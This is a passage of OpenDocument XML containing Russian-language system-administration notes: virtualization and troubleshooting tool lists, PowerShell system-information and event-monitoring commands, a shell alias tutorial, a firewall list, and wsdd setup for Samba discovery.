      <text:p text:style-name="P1">OpenNode (http://opennodecloud.com/) - Создает программное обеспечение для управления инфраструктурой с открытым исходным кодом и реализует облачные системы.</text:p>
      <text:p text:style-name="P1">oVirt (http://www.ovirt.org/)- Управление виртуальными машинами, хранилищами и виртуальными сетями.</text:p>
      <text:p text:style-name="P1">Packer (https://www.packer.io/) - Инструмент для создания идентичных образов машин для нескольких платформ из одной исходной конфигурации.</text:p>
      <text:p text:style-name="P1">Proxmox VE (https://www.proxmox.com/proxmox-ve) - Решение для управления виртуализацией.</text:p>
      <text:p text:style-name="P1">QEMU (http://www.qemu.org/) - универсальный эмулятор и виртуализатор машин.</text:p>
      <text:p text:style-name="P1">Vagrant (https://www.vagrantup.com/) - Инструмент для создания полноценных сред разработки.</text:p>
      <text:p text:style-name="P1">VirtualBox (https://www.virtualbox.org/) - Продукт виртуализации от корпорации Oracle.</text:p>
      <text:p text:style-name="P1">XCP-ng (http://www.xcp-ng.org/) - Основанная на Citrix XenServer, XCP-ng является полностью открытой платформой виртуализации.</text:p>
      <text:p text:style-name="P7">Xen (http://www.xenproject.org/)- Монитор виртуальных машин для 32/64 битных архитектур Intel / AMD (IA 64) и PowerPC 970.</text:p>
      <text:p text:style-name="P1">Как запустить команду с ограничением по времени в Linux. Наша цель - запустить команду с именем « ping www.cyberciti.biz» с ограничением по времени в 30 секунд:</text:p>
      <text:p text:style-name="P1">Откройте приложение терминала</text:p>
      <text:p text:style-name="P1">Запустите команду ping , чтобы она прервалась через 30 секунд:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">timeout 30s ping www.cyberciti.biz</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Можно комбинировать команды sleep и другие оболочки:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">ping www.cyberciti.biz &amp; sleep 30s; kill $!</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7">Давайте посмотрим все команды тайм-аута, синтаксис и примеры в операционных системах Linux. https://www.cyberciti.biz/faq/linux-run-a-command-with-a-time-limit/</text:p>
      <text:p text:style-name="P20">Как диагностировать таинственный процесс, который занимает слишком много ресурсов ЦП, памяти, и т. д.? На приведенной ниже диаграмме показаны полезные инструменты в системе Linux. 'vmstat' - сообщает информацию о процессах, памяти, подкачке, активности ЦП. 'iostat' - сообщает статистику процессора и ввода/вывода системы. 'netstat' - отображает статистические данные, относящиеся к протоколам IP, TCP, UDP и ICMP. 'lsof' - список открытых файлов текущей системы. «pidstat» - отслеживает использование системных ресурсов всеми или указанными процессами, включая ЦП, память, переключение задач, потоки и т. д.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Top 5+ SQL Interview Problem:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">1. Database and SQL - https://bit.ly/3zGK6S7</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">2. SQL Query - https://bit.ly/3bGzN8r</text:span><text:span text:style-name="T2"/></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Инструменты для поиска и устранения неисправностей:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">grml</text:span><text:span text:style-name="T3"> - загрузочный </text:span><text:span text:style-name="T2">Live</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">CD</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Debian</text:span><text:span text:style-name="T3"> с мощными инструментами </text:span><text:span text:style-name="T2">CLI</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">grml</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mitmproxy</text:span><text:span text:style-name="T3"> - инструмент </text:span><text:span text:style-name="T2">Python</text:span><text:span text:style-name="T3">, используемый для перехвата, просмотра и модификации сетевого трафика. Незаменим при устранении некоторых проблем </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">mitmproxy</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mtr</text:span><text:span text:style-name="T3"> - сетевая утилита, объединяющая </text:span><text:span text:style-name="T2">traceroute</text:span><text:span text:style-name="T3"> и </text:span><text:span text:style-name="T2">ping</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">bitwizard</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">nl</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">mtr</text:span><text:span text:style-name="T3">/</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">perf</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">tools</text:span><text:span text:style-name="T3"> - инструменты анализа производительности, основанные на </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">perf</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">events</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">aka</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">perf</text:span><text:span text:style-name="T3">) и </text:span><text:span text:style-name="T2">ftrace</text:span><text:span text:style-name="T3">. </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">brendangregg</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">perf</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">tools</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">wireshark</text:span><text:span text:style-name="T3"> - лучший в мире анализатор сетевых протоколов </text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">wireshark</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/</text:span></text:p>
      <text:p text:style-name="P1">PowerShell скрипты для сбора информации о компьютерах: Собираем сведения о рабочих столах локального компьютера: Get-CimInstance -ClassName Win32_Desktop</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Вывод</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сведений</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">о</text:span><text:span text:style-name="T2"> BIOS: Get-CimInstance -ClassName Win32_BIOS</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Вывод</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сведений</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">о</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">процессоре</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -Property SystemType</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">SystemType</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">----------</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">X86-based PC</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Получить</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">данные</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">поставщика</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">вычислительной</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">техники</text:span><text:span text:style-name="T2"> (OEM): Get-CimInstance -ClassName Win32_ComputerSystem</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Список</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">установленных</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">исправлений</text:span><text:span text:style-name="T2">: Get-CimInstance -ClassName Win32_QuickFixEngineering</text:span></text:p>
      <text:p text:style-name="P1">Перечисление сведений о версии операционной системы:</text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_OperatingSystem |</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>Select-Object -Property BuildNumber,BuildType,OSType,ServicePackMajorVersion,ServicePackMinorVersion</text:span></text:p>
      <text:p text:style-name="P1">Общие сведения о локальных пользователях:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_OperatingSystem |</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Select-Object -Property NumberOfLicensedUsers, NumberOfUsers, RegisteredUser</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property *user*</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Получение доступного места на диске:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" |</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Measure-Object -Property FreeSpace,Size -Sum |</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Select-Object -Property Property,Sum</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Получение</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сведений</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">о</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сеансе</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">входа</text:span><text:span text:style-name="T2">: Get-CimInstance -ClassName Win32_LogonSession</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Отобразить</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пользователя</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">вошедшего</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">определенную</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">компьютерную</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">систему</text:span><text:span text:style-name="T2">: Get-CimInstance -ClassName Win32_ComputerSystem -Property UserName</text:span></text:p>
      <text:p text:style-name="P1">Получение местного времени с компьютера: Get-CimInstance -ClassName Win32_LocalTime</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Отображение</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">состояния</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">службы</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_Service |</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Select-Object -Property Status,Name,DisplayName</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Get-CimInstance -ClassName Win32_Service |</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>Format-Table -Property Status, Name, DisplayName -AutoSize -Wrap</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">alias</text:span><text:span text:style-name="T3"> - команда, позволяющая создавать более краткие или более привычные псевдонимы для часто используемых команд. Команда </text:span><text:span text:style-name="T2">alias</text:span><text:span text:style-name="T3"> позволяет всего лишь связать псевдоним с произвольной командой. Механизм псевдонимов позволяет устанавливать более короткие или привычные имена для часто используемых команд. Еще одним преимуществом данного механизма является возможность использования в составе псевдонимов аргументов команд. Впервые данный механизм был реализован в рамках командной оболочки </text:span><text:span text:style-name="T2">csh</text:span><text:span text:style-name="T3">, после чего он был перенесен в такие командные оболочки, как </text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3"> и другие. Синтаксис команды для установки псевдонима зависит от используемой командной оболочки. В случае командных оболочек, основанных на </text:span><text:span text:style-name="T2">Bourne</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">shell</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">ksh</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3">, и других, но не </text:span><text:span text:style-name="T2">sh</text:span><text:span text:style-name="T3">), синтаксис является следующим:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">alias</text:span><text:span text:style-name="T3"> &lt;псевдоним&gt;=&lt;команда&gt;</text:span></text:p>
      <text:p text:style-name="P1">В том случае, если при вызове команды должна осуществляться передача аргументов, следует использовать одинарные или двойные кавычки:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">alias</text:span><text:span text:style-name="T3"> &lt;псевдоним&gt;="&lt;команда&gt; &lt;аргумент&gt; …"</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">В случае же командных оболочек, основанных на </text:span><text:span text:style-name="T2">csh</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">csh</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">tcsh</text:span><text:span text:style-name="T3"> и других), кавычки не требуются:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">alias</text:span><text:span text:style-name="T3"> &lt;псевдоним&gt; &lt;команда&gt; [аргументы …]</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Несложно заметить, что главное отличие в данном случае заключается в использовании знака равенства и необходимости использования кавычек. При вызове команды </text:span><text:span text:style-name="T2">alias</text:span><text:span text:style-name="T3"> без аргументов будет выведен список объявленных в текущее время псевдонимов. После установки псевдоним будет работать лишь в рамках текущей сессии командной оболочки.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Для того, чтобы активировать этот псевдоним на постоянной основе, вам придется добавить его в один из файлов конфигурации, используемой в текущее время командной оболочки. В случае командной оболочки </text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3"> псевдонимы для отдельных пользователей чаще всего размещаются в файле конфигурации ~/.</text:span><text:span text:style-name="T2">bashrc</text:span><text:span text:style-name="T3">, а общесистемные псевдонимы - в файле конфигурации /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">profile</text:span><text:span text:style-name="T3">. В случае командной оболочки </text:span><text:span text:style-name="T2">tcsh</text:span><text:span text:style-name="T3"> аналогичными файлами конфигурации являются файлы ~/.</text:span><text:span text:style-name="T2">tcshrc</text:span><text:span text:style-name="T3"> и /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">login</text:span><text:span text:style-name="T3"> соответственно.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Примеры: Простой псевдоним для пользователей операционной системы </text:span><text:span text:style-name="T2">DOS</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">alias</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">dir</text:span><text:span text:style-name="T3">="</text:span><text:span text:style-name="T2">ls</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">l</text:span><text:span text:style-name="T3">"</text:span></text:p>
      <text:p text:style-name="P1">А это пример более сложного псевдонима:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ alias topcom='sort ~/.bash_history | uniq -ci | sort -r | less'</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Данный псевдоним упрощает обращение к списку наиболее часто используемых команд и может стать шаблоном для новых псевдонимов. А это еще один пример псевдонима для ознакомления со списком смонтированных дисковых разделов:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ alias mnt='mount | grep -i /dev/[h]d[a..g] | sort'</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Механизм функций командной оболочки может выполнять ту же работу, что и механизм псевдонимов, но он гораздо сложнее в использовании. В отличие от функций, псевдонимы не позволяют осуществлять подстановку значений переменных. Например, даже такая простая функция, как</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">bak</text:span><text:span text:style-name="T3"> () { </text:span><text:span text:style-name="T2">cp</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">a</text:span><text:span text:style-name="T3"> $1 $1.</text:span><text:span text:style-name="T2">bak</text:span><text:span text:style-name="T3"> }</text:span></text:p>
      <text:p text:style-name="P1">не может быть преобразована в псевдоним из-за использования переменной "$1".</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Установка псевдонима на постоянной основе: Для установки псевдонима на постоянной основе для всех пользователей, всех командных оболочек (</text:span><text:span text:style-name="T2">ksh</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3">, …) и всех типов командных оболочек (использующихся и не использующихся для входа в систему) вам придется: модифицировать файл конфигурации /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">profile</text:span><text:span text:style-name="T3"> для командных оболочек, использующихся для входа в систему; модифицировать файл конфигурации /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">bash</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">bashrc</text:span><text:span text:style-name="T3"> для командных оболочек, не использующихся для входа в систему.</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Деактивация псевдонима: Используйте команду </text:span><text:span text:style-name="T2">unalias</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P1">Подборка фаерволлов для различных ОС:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">Linux: OpenSnitch (https://github.com/evilsocket/opensnitch); gufw (https://gufw.org/)Uncomplicated Firewall (https://en.wikipedia.org/wiki/Uncomplicated_Firewall)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Windows: SimpleWall (https://github.com/henrypp/simplewall); TinyWall (https://tinywall.pados.hu/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">MacOS: LuLu (https://objective-see.org/products/lulu.html); Little Snitch (https://obdev.at/products/littlesnitch/index.html)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Android: NetGuard (https://play.google.com/store/apps/details?id=eu.faircode.netguard); NoRoot Firewall (https://play.google.com/store/apps/details?id=app.greyshirts.firewall); AFWall+ (https://github.com/ukanth/afwall/); RethinkDNS + Firewall (https://github.com/celzero/rethink-app)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">iOS: Lockdown (https://apps.apple.com/in/app/lockdown-apps/id1469783711)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P19" loext:marker-style-name="T1"><text:span text:style-name="T2">Hardware: IPFire (https://www.ipfire.org/); Shorewall (https://shorewall.org/); OpenSense (https://opnsense.org/)</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">Powershell</text:span><text:span text:style-name="T3"> мониторинг событий 41, 1074, 6008. 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 </text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$StrData=[string]$flam.Date</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$message = $StrData + " " + "Сервер: $env:computername" + " " + "Система перезагрузилась, завершив работу с ошибками.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2" loext:marker-style-name="T1"><text:span text:style-name="T2">-----------------------------------------</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Мониторинг по событию 1074:</text:span><text:span text:style-name="T2"/></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oft-page-break/><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Мониторинг по событию 6008:</text:span><text:span text:style-name="T2"/></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19" loext:marker-style-name="T1"><text:span text:style-name="T2">$message = $env:computername + " " + $StrFlamDat + " " + $FlamDat.Action + " " + $FlamDat.User</text:span></text:p>
      <text:p text:style-name="P19" loext:marker-style-name="T1"><text:span text:style-name="T3">Включаем отображение </text:span><text:span text:style-name="T2">Samba</text:span><text:span text:style-name="T3">-сервера в сетевом окружении </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">. В последних версиях </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">samba</text:span><text:span text:style-name="T3"> сервера больше не отображаются в сетевом окружении, при этом они нормально работают при прямом подключении к ним. Это связано с полным отказом в </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3"> протокола </text:span><text:span text:style-name="T2">SMB</text:span><text:span text:style-name="T3">1 и невозможностью обнаружить </text:span><text:span text:style-name="T2">Samba</text:span><text:span text:style-name="T3"> по протоколу </text:span><text:span text:style-name="T2">NetBIOS</text:span><text:span text:style-name="T3">. Современные </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3"> системы используют для обнаружения устройств </text:span><text:span text:style-name="T2">WSD</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">Web</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Services</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">for</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Devices</text:span><text:span text:style-name="T3">) и сегодня мы расскажем, как добавить его поддержку для вашего сервера </text:span><text:span text:style-name="T2">Samba</text:span><text:span text:style-name="T3">. Для включения поддержки </text:span><text:span text:style-name="T2">WSD</text:span><text:span text:style-name="T3"> нам потребуется пакет </text:span><text:span text:style-name="T2">wsdd</text:span><text:span text:style-name="T3">, который штатно присутствует в репозиториях </text:span><text:span text:style-name="T2">Debian</text:span><text:span text:style-name="T3"> 12 и </text:span><text:span text:style-name="T2">Ubuntu</text:span><text:span text:style-name="T3"> 22.04, если вы используете другие версии систем, то вам потребуется подключить репозиторий разработчиков, он поддерживает </text:span><text:span text:style-name="T2">Debian</text:span><text:span text:style-name="T3"> 9 - 11, и </text:span><text:span text:style-name="T2">Ubuntu</text:span><text:span text:style-name="T3"> 16.04 - 22.04. Чтобы подключить репозиторий разработчиков сначала скачайте и импортируйте в хранилище ключ: </text:span><text:span text:style-name="T2">wget</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">O</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text:span><text:span text:style-name="T2">conf</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">ltec</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">ag</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gpg</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">key</text:span><text:span text:style-name="T3"> | </text:span><text:span text:style-name="T2">gpg</text:span><text:span text:style-name="T3"> --</text:span><text:span text:style-name="T2">dearmour</text:span><text:span text:style-name="T3"> &gt; /</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Теперь подключим сам репозиторий: </text:span><text:span text:style-name="T2">echo</text:span><text:span text:style-name="T3"> "</text:span><text:span text:style-name="T2">deb</text:span><text:span text:style-name="T3"> [</text:span><text:span text:style-name="T2">signed</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">by</text:span><text:span text:style-name="T3">=/</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 `</text:span><text:span text:style-name="T2">lsb</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">release</text:span><text:span text:style-name="T3"> -</text:span><text:span text:style-name="T2">cs</text:span><text:span text:style-name="T3">` </text:span><text:span text:style-name="T2">main</text:span><text:span text:style-name="T3">" &gt; /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">apt</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">sources</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">wsdd</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">list</text:span><text:span text:style-name="T3">. Обновим список пакетов и установим нужную нам службу:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">apt</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">update</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">apt</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">install</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">wsdd</text:span></text:p>
      <text:p text:style-name="P1">Пакет будет автоматически добавлен в автозагрузку и нам останется только запустить его и проверить статус:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># systemctl start wsdd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># systemctl status wsdd</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T3">По умолчанию служба работает на всех интерфейсах и протоколах, если мы хотим изменить данное поведение, то следует добавить необходимые опции </text:span><text:soft-page-break/><text:span text:style-name="T3">в файл /</text:span><text:span text:style-name="T2">etc</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">default</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">wsdd</text:span><text:span text:style-name="T3">, в нем находится единственная допустимая опция: </text:span><text:span text:style-name="T2">WSDD</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">PARAMS</text:span><text:span text:style-name="T3">="".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text:span><text:span text:style-name="T2">ens</text:span><text:span text:style-name="T3">33 и протоколом </text:span><text:span text:style-name="T2">IPv</text:span><text:span text:style-name="T3">4, то добавим: </text:span><text:span text:style-name="T2">WSDD</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">PARAMS</text:span><text:span text:style-name="T3">="--</text:span><text:span text:style-name="T2">interface</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ens</text:span><text:span text:style-name="T3">33 --</text:span><text:span text:style-name="T2">ipv</text:span><text:span text:style-name="T3">4</text:span><text:span text:style-name="T2">only</text:span><text:span text:style-name="T3">" Либо: </text:span><text:span text:style-name="T2">WSDD</text:span><text:span text:style-name="T3">_</text:span><text:span text:style-name="T2">PARAMS</text:span><text:span text:style-name="T3">="-</text:span><text:span text:style-name="T2">i</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ens</text:span><text:span text:style-name="T3">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text:span><text:span text:style-name="T2">systemctl</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">restart</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">wsdd</text:span><text:span text:style-name="T3">. Для нормальной работы службы вам также нужно разрешить в брандмауэре входящие соединения для </text:span><text:span text:style-name="T2">UDP</text:span><text:span text:style-name="T3"> 3702 и </text:span><text:span text:style-name="T2">TCP</text:span><text:span text:style-name="T3"> 5357. Со стороны </text:span><text:span text:style-name="T2">Windows</text:span><text:span 